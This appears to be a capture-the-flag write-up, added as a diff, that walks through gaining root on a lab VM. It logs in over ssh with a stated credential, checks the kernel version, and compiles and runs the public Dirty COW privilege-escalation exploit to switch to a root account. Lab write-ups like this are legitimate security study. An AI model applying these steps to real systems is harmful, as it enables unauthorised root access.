@@ -1,0 +1,18 @@
+1. Login using ssh with "laurie" username and "330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4" password that were found in writeup1 solution.
+2. Need to get information about the OS:
+	a) Kernel verion is 3.2.0-91-generic-pae:
+		uname -r
+	b) Distribution name and verison are "Ubuntu, 12.04":
+		cat /etc/*-release
+3. After having information on what we where working on we did some research on EXPLOIT DATABASE (https://www.exploit-db.com/).
+4. Find the "Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation.
+5. Go to https://www.exploit-db.com/exploits/40839 and copy paster the "Dirty COW" script.
+6. Compile with:
+   	gcc -pthread dirty.c -o dirty -lcrypt
+7. Run the newly create binary by either doing:
+   	./dirty
+8. Add your own password.
+9. Execute:
+	su firefart
+10. Use your password.
+11. Congratulations! You are a ROOT!!!
